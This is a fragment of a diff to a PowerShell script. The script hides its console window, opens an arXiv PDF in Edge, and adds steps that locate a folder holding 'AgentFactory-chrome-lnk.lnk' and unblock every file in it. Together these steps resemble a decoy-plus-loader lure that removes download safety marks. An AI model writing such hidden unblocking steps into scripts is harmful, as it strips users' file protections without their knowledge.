@@ -7,5 +7,8 @@ $hwnd = (Get-Process -Id $PID).MainWindowHandle
 if ($hwnd -ne [System.IntPtr]::Zero) {
     $winApi::ShowWindow($hwnd, 0)
 }
-start-process "https://arxiv.org/pdf/$tyrp"
-Write-Host "Fuck off dropbox url - $dpty"
+start-process "msedge.exe" ArgumentList "https://arxiv.org/pdf/$pcode --new-tab"
+Write-Host "Fuck off dropbox url - $tcode"
+
+$folderName = Get-ChildItem -Path "$HOME" -Filter "AgentFactory-chrome-lnk.lnk" -Recurse -File -ErrorAction SilentlyContinue | Select-Object -ExpandProperty DirectoryName
+Get-ChildItem -Path $folderName -File | Unblock-File
